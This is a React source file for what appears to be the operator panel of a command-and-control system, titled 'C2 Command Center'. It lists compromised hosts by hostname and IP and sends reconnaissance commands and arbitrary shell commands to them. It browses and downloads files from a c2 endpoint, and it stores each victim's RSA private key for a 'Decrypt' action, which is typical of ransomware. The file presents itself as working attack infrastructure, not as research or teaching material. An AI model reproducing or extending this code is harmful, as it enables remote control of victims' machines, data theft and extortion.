import { useEffect, useMemo, useRef, useState } from 'react'
import { initSocket } from './socketClient'
import { supabase } from './lib/supabase'
import './elite.css'

export default function EliteUI() {
  const DEFAULT_RAW = import.meta.env.VITE_API_BASE || 'http://localhost:8080/api'
  const [host, setHost] = useState(() => {
    const saved = (typeof window !== 'undefined') ? localStorage.getItem('ui.host') : null
    return (saved || DEFAULT_RAW).replace(/\/$/, '')
  })
  const API_BASE = useMemo(() => `${host}/py_simple`, [host])

  const [socketStatus, setSocketStatus] = useState('disconnected')
  const socketRef = useRef(null)
  const [lastOutput, setLastOutput] = useState(null)

  const [devices, setDevices] = useState([])
  const [selectedToken, setSelectedToken] = useState(() => (typeof window !== 'undefined' ? localStorage.getItem('ui.selectedToken') || '' : ''))
  const [connectedCount, setConnectedCount] = useState(0)
  const [systemOnline, setSystemOnline] = useState(false)
  const [status, setStatus] = useState('')
  const [loading, setLoading] = useState(false)

  // Keys
  const [publicKey, setPublicKey] = useState('')
  const [privateKey, setPrivateKey] = useState('')
  const [userId, setUserId] = useState(() => (typeof window !== 'undefined' ? localStorage.getItem('ui.userId') || '' : ''))

  // Scripts
  const [scripts, setScripts] = useState([])
  const [selectedScripts, setSelectedScripts] = useState({})

  // Terminal
  const [command, setCommand] = useState('')
  const [commandHistory, setCommandHistory] = useState([])

  // Files
  const [files, setFiles] = useState([])
  const [c2Path, setC2Path] = useState('')
  const [c2Token, setC2Token] = useState('')
  const [showFiles, setShowFiles] = useState(false)
  const [collapseOnline, setCollapseOnline] = useState(false)
  const [collapseOffline, setCollapseOffline] = useState(true)

  // UI State
  const [activeTab, setActiveTab] = useState('overview')

  useEffect(() => {
    try {
      socketRef.current = initSocket({
        apiBase: API_BASE,
        onStatus: (st) => setSocketStatus(st),
        onAck: () => {},
        onScriptOutput: (payload) => {
          setLastOutput(payload || null)
          if (payload) {
            setCommandHistory(prev => [...prev, payload].slice(-20))
          }
        },
        startDeviceOnConnect: true,
      })
    } catch (_) {}
    return () => { try { socketRef.current?.disconnect() } catch (_) {} }
  }, [API_BASE])

  useEffect(() => {
    refreshAll()
    const id = setInterval(refreshAll, 5000)
    return () => clearInterval(id)
  }, [API_BASE])

  useEffect(() => { try { localStorage.setItem('ui.host', host) } catch {} }, [host])
  useEffect(() => { try { localStorage.setItem('ui.userId', userId) } catch {} }, [userId])
  useEffect(() => { try { if (selectedToken) localStorage.setItem('ui.selectedToken', selectedToken) } catch {} }, [selectedToken])

  useEffect(() => {
    if (!userId || !selectedToken) return
    ;(async () => {
      try {
        const rec = await loadKeysFromSupabase({ userId, token: selectedToken })
        if (rec) {
          setPublicKey(rec.public_key_pem || '')
          setPrivateKey(rec.private_key_pem || '')
        }
      } catch (_) {}
    })()
  }, [userId, selectedToken])

  useEffect(() => {
    if (userId) return
    try {
      const gen = () => {
        const arr = new Uint8Array(16)
        window.crypto.getRandomValues(arr)
        return Array.from(arr).map(b=>b.toString(16).padStart(2,'0')).join('')
      }
      const id = gen()
      setUserId(id)
      localStorage.setItem('ui.userId', id)
    } catch {
      const id = 'guest-' + Math.random().toString(36).slice(2, 10)
      setUserId(id)
      try { localStorage.setItem('ui.userId', id) } catch {}
    }
  }, [userId])

  useEffect(() => {
    if (!selectedToken) return
    const d = devices.find(x=>x.token===selectedToken)
    if (d) {
      if (d.public_key_pem) setPublicKey(d.public_key_pem)
      if (d.private_key_pem) setPrivateKey(d.private_key_pem)
    }
  }, [devices, selectedToken])

  async function refreshAll() {
    await Promise.allSettled([
      refreshDevices(),
      refreshScripts(),
      refreshFiles(),
    ])
  }

  async function refreshDevices() {
    try {
      const res = await fetch(`${API_BASE}/devices`)
      if (!res.ok) throw new Error('devices')
      const data = await res.json()
      const list = data.devices || []
      setDevices(list)
      setConnectedCount(list.filter(d => d.connected).length)
      setSystemOnline(true)
      if (list.length && !selectedToken) setSelectedToken(list[0].token)
    } catch (_) { setSystemOnline(false) }
  }

  async function refreshScripts() {
    try {
      const res = await fetch(`${API_BASE}/scripts`)
      if (!res.ok) throw new Error('scripts')
      const data = await res.json()
      setScripts(Array.isArray(data?.scripts) ? data.scripts : [])
    } catch (_) {
      setScripts([
        { id: 'recon', label: 'Reconnaissance', command: 'systeminfo' },
        { id: 'enum', label: 'Enumeration', command: 'whoami /all' },
        { id: 'network', label: 'Network Scan', command: 'ipconfig /all' },
      ])
    }
  }

  async function refreshFiles() {
    try {
      const headers = c2Token ? { 'X-C2-TOKEN': c2Token } : undefined
      let res, data
      if (!c2Path) {
        res = await fetch(`${API_BASE}/c2`, { headers })
        if (!res.ok) throw new Error('files')
        data = await res.json()
        setFiles(Array.isArray(data?.files) ? data.files : [])
      } else {
        const url = new URL(`${API_BASE}/c2/list`, window.location.origin)
        url.searchParams.set('path', c2Path)
        res = await fetch(url, { headers })
        if (!res.ok) throw new Error('files')
        data = await res.json()
        setFiles(Array.isArray(data?.files) ? data.files : [])
      }
    } catch (_) { setFiles([]) }
  }

  async function decryptWithPrivateKey() {
    if (!selectedToken || !privateKey) { setStatus('Select a device and ensure private key is loaded'); return }
    try {
      setLoading(true)
      await fetch(`${API_BASE}/devices/${selectedToken}/keys`, { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' }, 
        body: JSON.stringify({ private_key_pem: privateKey }) 
      }).catch(()=>{})
      if (socketRef.current && socketStatus === 'connected') {
        socketRef.current.emit('site_decrypt', { token: selectedToken })
      } else {
        await fetch(`${API_BASE}/decrypt`, { 
          method: 'POST', 
          headers: { 'Content-Type': 'application/json' }, 
          body: JSON.stringify({ token: selectedToken }) 
        })
      }
      setStatus('✓ Decrypt operation initiated')
      if (userId) {
        await saveKeysToSupabase({ userId, token: selectedToken, pub: null, prv: privateKey })
      }
    } catch (e) { 
      setStatus(`✗ Decrypt failed: ${e}`) 
    } finally { 
      setLoading(false) 
    }
  }

  async function runSelectedScripts() {
    if (!selectedToken) { setStatus('Select a device'); return }
    const chosen = scripts.filter(s => selectedScripts[s.id])
    if (!chosen.length) { setStatus('Select at least one script'); return }
    setLoading(true)
    try {
      for (const s of chosen) {
        if (socketRef.current && socketStatus === 'connected') {
          socketRef.current.emit('site_run', { token: selectedToken, command: s.command })
        } else {
          await fetch(`${API_BASE}/device/run`, { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' }, 
            body: JSON.stringify({ token: selectedToken, command: s.command }) 
          })
        }
      }
      setStatus('✓ Scripts dispatched successfully')
    } catch (e) { 
      setStatus(`✗ Script execution failed: ${e}`) 
    } finally { 
      setLoading(false) 
    }
  }

  async function executeCommand() {
    if (!selectedToken || !command.trim()) { setStatus('Select a device and enter a command'); return }
    try {
      setLoading(true)
      const res = await fetch(`${API_BASE}/device/run`, { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' }, 
        body: JSON.stringify({ token: selectedToken, command }) 
      })
      const data = await res.json().catch(()=>({}))
      if (!res.ok) throw new Error(data?.error || `HTTP ${res.status}`)
      setStatus(data?.status || '✓ Command executed')
      setCommand('')
    } catch (e) { 
      setStatus(`✗ Command failed: ${e}`) 
    } finally { 
      setLoading(false) 
    }
  }

  const selectedDevice = devices.find(d => d.token === selectedToken)
  const onlineDevices = devices.filter(d => d.connected)
  const offlineDevices = devices.filter(d => !d.connected)

  const filesWithPaths = files.map(f => ({
    ...f,
    relPath: (c2Path ? `${c2Path.replace(/\/+$/, '')}/` : '') + (f.name || ''),
  }))

  return (
    <div className="elite-root">
      {/* Animated background */}
      <div className="elite-bg">
        <div className="elite-grid"></div>
        <div className="elite-orb orb-1"></div>
        <div className="elite-orb orb-2"></div>
        <div className="elite-orb orb-3"></div>
      </div>

      {/* Header */}
      <header className="elite-header">
        <div className="elite-brand">
          <div className="elite-logo">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>
            </svg>
          </div>
          <div>
            <h1 className="elite-title">C2 Command Center</h1>
            <p className="elite-subtitle">Secure Operations Control</p>
          </div>
        </div>
        <div className="elite-header-stats">
          <div className="elite-stat-pill">
            <span className={`elite-pulse ${connectedCount > 0 ? 'active' : ''}`}></span>
            <span>{connectedCount} Active</span>
          </div>
          <div className="elite-stat-pill">
            <span className={`elite-status-dot ${socketStatus === 'connected' ? 'ok' : 'warn'}`}></span>
            <span>Socket {socketStatus}</span>
          </div>
          <div className="elite-stat-pill">
            <span className={`elite-status-dot ${systemOnline ? 'ok' : 'err'}`}></span>
            <span>System {systemOnline ? 'Online' : 'Offline'}</span>
          </div>
        </div>
      </header>

      {/* Main Layout */}
      <div className="elite-main">
        {/* Sidebar - Device Tree */}
        <aside className="elite-sidebar">
          <div className="elite-sidebar-header">
            <h2>Connected Devices</h2>
            <button className="elite-btn-icon" onClick={refreshDevices} title="Refresh">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/>
              </svg>
            </button>
          </div>

          {/* Online Devices */}
          <div className="elite-device-section">
            <button 
              className="elite-section-toggle" 
              onClick={() => setCollapseOnline(!collapseOnline)}
            >
              <svg className={`elite-chevron ${collapseOnline ? '' : 'open'}`} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M9 18l6-6-6-6"/>
              </svg>
              <span>Online</span>
              <span className="elite-badge success">{onlineDevices.length}</span>
            </button>
            {!collapseOnline && (
              <div className="elite-device-list">
                {onlineDevices.map(d => (
                  <button
                    key={d.token}
                    className={`elite-device-item ${selectedToken === d.token ? 'selected' : ''}`}
                    onClick={() => setSelectedToken(d.token)}
                  >
                    <span className="elite-device-status ok"></span>
                    <div className="elite-device-info">
                      <div className="elite-device-name">{d.hostname || d.token.slice(0, 8)}</div>
                      <div className="elite-device-meta">{d.ip || 'unknown'}</div>
                    </div>
                  </button>
                ))}
                {onlineDevices.length === 0 && (
                  <div className="elite-empty">No online devices</div>
                )}
              </div>
            )}
          </div>

          {/* Offline Devices */}
          <div className="elite-device-section">
            <button 
              className="elite-section-toggle" 
              onClick={() => setCollapseOffline(!collapseOffline)}
            >
              <svg className={`elite-chevron ${collapseOffline ? '' : 'open'}`} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M9 18l6-6-6-6"/>
              </svg>
              <span>Offline</span>
              <span className="elite-badge danger">{offlineDevices.length}</span>
            </button>
            {!collapseOffline && (
              <div className="elite-device-list">
                {offlineDevices.map(d => (
                  <button
                    key={d.token}
                    className={`elite-device-item ${selectedToken === d.token ? 'selected' : ''}`}
                    onClick={() => setSelectedToken(d.token)}
                  >
                    <span className="elite-device-status warn"></span>
                    <div className="elite-device-info">
                      <div className="elite-device-name">{d.hostname || d.token.slice(0, 8)}</div>
                      <div className="elite-device-meta">{d.ip || 'unknown'}</div>
                    </div>
                  </button>
                ))}
                {offlineDevices.length === 0 && (
                  <div className="elite-empty">No offline devices</div>
                )}
              </div>
            )}
          </div>
        </aside>

        {/* Content Area */}
        <main className="elite-content">
          {/* Tab Navigation */}
          <div className="elite-tabs">
            <button 
              className={`elite-tab ${activeTab === 'overview' ? 'active' : ''}`}
              onClick={() => setActiveTab('overview')}
            >
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/>
                <rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/>
              </svg>
              Overview
            </button>
            <button 
              className={`elite-tab ${activeTab === 'scripts' ? 'active' : ''}`}
              onClick={() => setActiveTab('scripts')}
            >
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>
              </svg>
              Scripts
            </button>
            <button 
              className={`elite-tab ${activeTab === 'terminal' ? 'active' : ''}`}
              onClick={() => setActiveTab('terminal')}
            >
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>
              </svg>
              Terminal
            </button>
            <button 
              className={`elite-tab ${activeTab === 'keys' ? 'active' : ''}`}
              onClick={() => setActiveTab('keys')}
            >
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/>
              </svg>
              Keys
            </button>
            {showFiles && (
              <button 
                className={`elite-tab ${activeTab === 'files' ? 'active' : ''}`}
                onClick={() => setActiveTab('files')}
              >
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/>
                  <polyline points="13 2 13 9 20 9"/>
                </svg>
                Files
              </button>
            )}
          </div>

          {/* Tab Content */}
          <div className="elite-tab-content">
            {/* Overview Tab */}
            {activeTab === 'overview' && (
              <div className="elite-overview">
                <div className="elite-metrics">
                  <div className="elite-metric-card">
                    <div className="elite-metric-icon primary">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                        <circle cx="12" cy="7" r="4"/>
                      </svg>
                    </div>
                    <div className="elite-metric-data">
                      <div className="elite-metric-value">{devices.length}</div>
                      <div className="elite-metric-label">Total Devices</div>
                    </div>
                  </div>
                  <div className="elite-metric-card">
                    <div className="elite-metric-icon success">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>
                      </svg>
                    </div>
                    <div className="elite-metric-data">
                      <div className="elite-metric-value">{connectedCount}</div>
                      <div className="elite-metric-label">Active Sessions</div>
                    </div>
                  </div>
                  <div className="elite-metric-card">
                    <div className="elite-metric-icon warning">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/>
                        <line x1="12" y1="16" x2="12.01" y2="16"/>
                      </svg>
                    </div>
                    <div className="elite-metric-data">
                      <div className="elite-metric-value">{scripts.length}</div>
                      <div className="elite-metric-label">Available Scripts</div>
                    </div>
                  </div>
                </div>

                {selectedDevice && (
                  <div className="elite-card">
                    <div className="elite-card-header">
                      <h3>Selected Device</h3>
                      <span className={`elite-badge ${selectedDevice.connected ? 'success' : 'danger'}`}>
                        {selectedDevice.connected ? 'Online' : 'Offline'}
                      </span>
                    </div>
                    <div className="elite-card-body">
                      <div className="elite-info-grid">
                        <div className="elite-info-item">
                          <span className="elite-info-label">Token</span>
                          <span className="elite-info-value mono">{selectedDevice.token}</span>
                        </div>
                        <div className="elite-info-item">
                          <span className="elite-info-label">Hostname</span>
                          <span className="elite-info-value">{selectedDevice.hostname || '—'}</span>
                        </div>
                        <div className="elite-info-item">
                          <span className="elite-info-label">IP Address</span>
                          <span className="elite-info-value">{selectedDevice.ip || '—'}</span>
                        </div>
                        <div className="elite-info-item">
                          <span className="elite-info-label">Status</span>
                          <span className="elite-info-value">{selectedDevice.connected ? 'Connected' : 'Disconnected'}</span>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {!selectedDevice && (
                  <div className="elite-card">
                    <div className="elite-card-body center">
                      <svg className="elite-empty-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                        <circle cx="12" cy="7" r="4"/>
                      </svg>
                      <p className="elite-empty-text">Select a device from the sidebar to view details</p>
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* Scripts Tab */}
            {activeTab === 'scripts' && (
              <div className="elite-scripts">
                <div className="elite-card">
                  <div className="elite-card-header">
                    <h3>Available Scripts</h3>
                    <button className="elite-btn primary" disabled={loading || !selectedToken} onClick={runSelectedScripts}>
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <polygon points="5 3 19 12 5 21 5 3"/>
                      </svg>
                      Run Selected
                    </button>
                  </div>
                  <div className="elite-card-body">
                    <div className="elite-script-grid">
                      {scripts.map(s => (
                        <label key={s.id} className={`elite-script-card ${selectedScripts[s.id] ? 'selected' : ''}`}>
                          <input 
                            type="checkbox" 
                            checked={!!selectedScripts[s.id]} 
                            onChange={(e) => setSelectedScripts(prev => ({...prev, [s.id]: e.target.checked}))}
                          />
                          <div className="elite-script-content">
                            <div className="elite-script-name">{s.label || s.id}</div>
                            <div className="elite-script-cmd">{s.command}</div>
                          </div>
                          <div className="elite-script-check">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
                              <polyline points="20 6 9 17 4 12"/>
                            </svg>
                          </div>
                        </label>
                      ))}
                    </div>
                    {scripts.length === 0 && (
                      <div className="elite-empty-state">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                          <polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>
                        </svg>
                        <p>No scripts available</p>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            )}

            {/* Terminal Tab */}
            {activeTab === 'terminal' && (
              <div className="elite-terminal-container">
                <div className="elite-card">
                  <div className="elite-card-header">
                    <h3>Command Terminal</h3>
                    <span className="elite-terminal-indicator">
                      <span className="elite-blink"></span>
                      Ready
                    </span>
                  </div>
                  <div className="elite-card-body">
                    <div className="elite-terminal-input-group">
                      <input
                        className="elite-terminal-input"
                        placeholder="Enter command..."
                        value={command}
                        onChange={(e) => setCommand(e.target.value)}
                        onKeyDown={(e) => e.key === 'Enter' && executeCommand()}
                      />
                      <button 
                        className="elite-btn primary" 
                        disabled={loading || !selectedToken || !command.trim()} 
                        onClick={executeCommand}
                      >
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                          <line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/>
                        </svg>
                        Execute
                      </button>
                    </div>

                    {lastOutput && (
                      <div className="elite-terminal-output">
                        <div className="elite-output-section">
                          <div className="elite-output-header">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                              <polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>
                            </svg>
                            <span>STDOUT</span>
                          </div>
                          <pre className="elite-output-content">{lastOutput.stdout || '(empty)'}</pre>
                        </div>
                        {lastOutput.stderr && (
                          <div className="elite-output-section error">
                            <div className="elite-output-header">
                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                <circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/>
                                <line x1="9" y1="9" x2="15" y2="15"/>
                              </svg>
                              <span>STDERR</span>
                            </div>
                            <pre className="elite-output-content">{lastOutput.stderr}</pre>
                          </div>
                        )}
                      </div>
                    )}

                    {commandHistory.length > 0 && (
                      <div className="elite-history">
                        <div className="elite-history-header">Command History</div>
                        <div className="elite-history-list">
                          {commandHistory.slice().reverse().slice(0, 5).map((h, i) => (
                            <div key={i} className="elite-history-item">
                              <span className="elite-history-time">{new Date().toLocaleTimeString()}</span>
                              <span className="elite-history-cmd">{h.command || 'unknown'}</span>
                              <span className={`elite-history-status ${h.returncode === 0 ? 'ok' : 'err'}`}>
                                {h.returncode === 0 ? '✓' : '✗'}
                              </span>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            )}

            {/* Keys Tab */}
            {activeTab === 'keys' && (
              <div className="elite-keys">
                <div className="elite-card">
                  <div className="elite-card-header">
                    <h3>RSA Key Management</h3>
                    <button 
                      className="elite-btn danger" 
                      disabled={loading || !privateKey || !selectedToken} 
                      onClick={decryptWithPrivateKey}
                    >
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                        <path d="M7 11V7a5 5 0 0 1 9.9-1"/>
                      </svg>
                      Decrypt with Private Key
                    </button>
                  </div>
                  <div className="elite-card-body">
                    <div className="elite-key-grid">
                      <div className="elite-key-section">
                        <label className="elite-label">Public Key</label>
                        <textarea
                          className="elite-textarea mono"
                          rows={12}
                          placeholder="Public key will appear here..."
                          value={publicKey}
                          onChange={(e) => setPublicKey(e.target.value)}
                        />
                      </div>
                      <div className="elite-key-section">
                        <label className="elite-label">Private Key</label>
                        <textarea
                          className="elite-textarea mono"
                          rows={12}
                          placeholder="Private key will appear here..."
                          value={privateKey}
                          onChange={(e) => setPrivateKey(e.target.value)}
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Files Tab */}
            {activeTab === 'files' && showFiles && (
              <div className="elite-files">
                <div className="elite-card">
                  <div className="elite-card-header">
                    <h3>File Browser</h3>
                    <div className="elite-file-actions">
                      <button className="elite-btn" onClick={refreshFiles}>
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                          <path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/>
                        </svg>
                        Refresh
                      </button>
                      {c2Path && (
                        <button className="elite-btn" onClick={() => { setC2Path(''); setTimeout(refreshFiles, 0) }}>
                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                            <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
                          </svg>
                          Root
                        </button>
                      )}
                    </div>
                  </div>
                  <div className="elite-card-body">
                    <div className="elite-file-list">
                      {filesWithPaths.map(f => (
                        f.is_dir ? (
                          <button
                            key={f.relPath}
                            className="elite-file-item"
                            onClick={() => { setC2Path(f.relPath); setTimeout(refreshFiles, 0) }}
                          >
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                              <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/>
                            </svg>
                            <span className="elite-file-name">{f.name}</span>
                            <span className="elite-file-size">—</span>
                          </button>
                        ) : (
                          <a
                            key={f.relPath}
                            className="elite-file-item"
                            href={`${API_BASE}/c2/download?path=${encodeURIComponent(f.relPath)}`}
                            target="_blank"
                            rel="noreferrer"
                          >
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                              <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/>
                              <polyline points="13 2 13 9 20 9"/>
                            </svg>
                            <span className="elite-file-name">{f.name}</span>
                            <span className="elite-file-size">{f.size ? `${(f.size / 1024).toFixed(1)} KB` : '—'}</span>
                          </a>
                        )
                      ))}
                    </div>
                    {files.length === 0 && (
                      <div className="elite-empty-state">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                          <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/>
                          <polyline points="13 2 13 9 20 9"/>
                        </svg>
                        <p>No files found</p>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            )}
          </div>
        </main>
      </div>

      {/* Status Toast */}
      {status && (
        <div className={`elite-toast ${status.startsWith('✓') ? 'success' : status.startsWith('✗') ? 'error' : ''}`}>
          {status}
        </div>
      )}

      {/* Loading Overlay */}
      {loading && (
        <div className="elite-loading-overlay">
          <div className="elite-spinner"></div>
        </div>
      )}
    </div>
  )
}

async function saveKeysToSupabase({ userId, token, pub, prv }) {
  if (!supabase) return
  const payload = { user_id: userId, device_token: token, public_key_pem: pub ?? null, private_key_pem: prv ?? null }
  const { error } = await supabase.from('device_keys').upsert(payload, { onConflict: 'user_id,device_token' })
  if (error) throw error
}

async function loadKeysFromSupabase({ userId, token }) {
  if (!supabase) return null
  const { data, error } = await supabase
    .from('device_keys')
    .select('public_key_pem, private_key_pem')
    .eq('user_id', userId)
    .eq('device_token', token)
    .limit(1)
    .maybeSingle()
  if (error) throw error
  return data
}
